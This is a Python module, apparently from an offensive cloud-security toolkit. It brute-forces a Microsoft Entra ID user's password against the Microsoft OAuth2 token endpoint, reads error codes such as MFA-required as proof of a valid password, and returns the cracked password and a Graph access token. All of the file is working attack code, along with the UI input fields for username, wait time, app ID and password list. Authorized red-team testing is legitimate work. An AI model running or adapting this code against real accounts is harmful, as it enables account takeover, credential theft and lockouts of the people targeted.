import requests
import base64
import time

def TechniqueMain(user_name, wait = None, client_id = None, password_file_content = None):
    '''Performs password bruteforce by attempting to generate graph access token by authenticating with a username & list of passwords.'''

    # username input validation
    if user_name == [None,""]:
        return {"Error" : "Username input required"}

    # passwords file input validation
    if password_file_content in [None,""]:
        return {"Error" : "Passwords file required"}
    if password_file_content[0] in [None,""]:
        return {"Error" : "Passwords file required"}

    # client id input validation
    if client_id in [None, ""]:
        client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c" #Setting the default client to use if user does not specify

    # wait time input validation
    if wait in [None,""]:
        wait = 5 #set default to 5 seconds

    endpoint_url = "https://login.microsoft.com/common/oauth2/token"
    resource = "https://graph.microsoft.com"
    scope = ['openid']
    
    headers = {
        "Accept" : "application/json",
        "Content-Type" : "application/x-www-form-urlencoded"
    }

    # extract passwords from text file
    content_string = password_file_content[0].split(',')[-1]
    decoded = base64.b64decode(content_string)
    try:
        text = decoded.decode('utf-8')
        passwords_list = text.split('\n')
    except:
        return {"Error" : "Failed to read password file"}

    attempts_count = 0
    # start bruteforce
    for password in passwords_list:
        data = {
            "grant_type": "password",
            "password" : password,
            "client_id" : client_id,
            "username" : user_name,
            "resource" : resource,
            "scope" : ' '.join(scope)
        }

        # increment attempt counter
        attempts_count += 1

        # request access token
        try:
            raw_response = requests.post(url = endpoint_url, headers = headers, data = data)
            
            if 200 <= raw_response.status_code < 300:
                try:
                    access_token = raw_response.json().get('access_token')
                    pretty_response = {}
                    pretty_response["Success"] = {
                        "Message" : "Password found",
                        "Username" : user_name,
                        "Matched Password" : password, 
                        "Access Token" : access_token,
                        "Additional Info" : {"Total Passwords" : len(passwords_list), "Attempted Passwords" : attempts_count} 
                    }

                    return True, raw_response, pretty_response
                except:
                    return True, raw_response, None
                
            # check for error codes that indicate correct password but auth failed due to other reasons
            elif any(e_code in [50076,50072, 50074, 50005, 50131] for e_code in raw_response.json().get('error_codes')):
                try:
                    pretty_response = {}
                    pretty_response = {
                        "Message" : "Password found",
                        "Username" : user_name,
                        "Matched Password" : password,
                        "Access Token" : None,
                        "Additional Info" : {"Error code" : raw_response.json().get('error_codes', 'N/A'), "Error":raw_response.json().get('error', 'N/A'), "Error_Description" : raw_response.json().get('error_description', 'N/A')}
                    }
                    return True, raw_response, pretty_response
                except:
                    return True, raw_response, None
            
            else:
                # continue bruteforce
                raise Exception("Invalid Password")

        except:
            # wait before next attempt
            time.sleep(wait)
    
    # return reponse if bruteforce fails
    pretty_response = {}
    pretty_response["Completed"] = {
        "Message" : "Bruteforce unsuccessful. No password match",
        "Username" : user_name,
        "Matched Password" : None, 
        "Access Token" : None,
        "Additional Info" : {"Total Passwords" : len(passwords_list), "Attempted Passwords" : attempts_count}
    }

    return False, raw_response, pretty_response


def TechniqueInputSrc():
    '''Returns the input fields required as parameters for the technique execution'''

    return [
        {"title" : "Username", "id" : "bf-text-input-username", "type" : "text", "placeholder" : "user@corp.com", "element_type" : "dcc.Input"},
        {"title" : "Wait (Seconds)", "id" : "bf-wait-input", "type" : "number", "placeholder" : "5", "element_type" : "dcc.Input"},
        {"title" : "App ID (Optional)", "id" : "bf-client-id-text-input", "type" : "text", "placeholder" : "Optional (Default: Microsoft Office)", "element_type" : "dcc.Input"},
        {"title" : "Password File", "id" : "bf-password-file-uploader", "type" : "password", "placeholder" : "you got this right?", "element_type" : "dcc.Upload"}
    ]